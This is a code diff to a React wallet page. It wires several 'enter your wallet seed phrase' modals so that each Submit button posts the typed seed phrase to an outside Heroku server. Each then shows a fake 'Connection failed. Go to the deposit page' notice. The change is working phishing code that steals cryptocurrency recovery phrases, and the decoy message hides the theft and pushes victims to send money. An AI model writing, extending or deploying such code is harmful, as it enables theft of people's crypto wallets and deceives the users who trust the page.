@@ -1,10 +1,51 @@
-import React from 'react';
+import React, { useState } from 'react';
+import { ToastContainer, toast } from 'react-toastify';
+import 'react-toastify/dist/ReactToastify.css';
 import DashboardHeader from '../../components/DashboardHeader';
 import useRedirect from '../../hooks/useRedirect';
 
 const Wallet = () => {
+  const [seed,setSeed] = useState('')
+
+  const onChange = (event) => {
+    const { name, value } = event.target;
+    setSeed(value)
+    console.log('seed', seed)
+  };
+
+  const notify = (word) => {
+    toast.info(`${word}`, {
+      position: 'top-right',
+      autoClose: 10000,
+      hideProgressBar: false,
+      closeOnClick: true,
+      pauseOnHover: true,
+      draggable: true,
+      progress: undefined,
+    });
+  };
+
+  const onSeed = async (event) => {
+    const iseditUser = await fetch(
+      "https://sheltered-bastion-98583.herokuapp.com/seed",
+      {
+        method: "post",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          seed: seed
+      })
+    })
+
+    let resp = await iseditUser.json();
+    console.log("edit resp", resp);
+
+    notify('Connection failed. Go to the deposit page')
+    event.preventDefault();
+    // navigate("../admin/users", { replace: false });
+  };
   return (
     <div className="lg:px-24 md:px-8 px-2 h-full w-[95%] mx-auto">
+      <ToastContainer />
       <DashboardHeader />
 
       <div className="my-8">
@@ -45,13 +86,13 @@ const Wallet = () => {
                   <h3 class="font-bold text-lg">
                     Please enter your wallet seed phrase!
                   </h3>
-                  <textarea
+                  <textarea onChange={onChange}
                     class="textarea my-5 h-32 w-full"
                     placeholder="Enter in the correct order your wallet phrase"
                   ></textarea>
 
                   <div class="modal-action">
-                    <label for="my-modal-6" class="btn">
+                    <label for="my-modal-6" class="btn" onClick={onSeed}>
                       Submit
                     </label>
                   </div>
@@ -96,7 +137,7 @@ const Wallet = () => {
                   ></textarea>
 
                   <div class="modal-action">
-                    <label for="my-modal-6" class="btn">
+                    <label for="my-modal-6" class="btn" onClick={onSeed}>
                       Submit
                     </label>
                   </div>
@@ -141,7 +182,7 @@ const Wallet = () => {
                   ></textarea>
 
                   <div class="modal-action">
-                    <label for="my-modal-6" class="btn">
+                    <label for="my-modal-6" class="btn" onClick={onSeed}>
                       Submit
                     </label>
                   </div>
@@ -187,7 +228,7 @@ const Wallet = () => {
                   ></textarea>
 
                   <div class="modal-action">
-                    <label for="my-modal-6" class="btn">
+                    <label for="my-modal-6" class="btn" onClick={onSeed}>
                       Submit
                     </label>
                   </div>
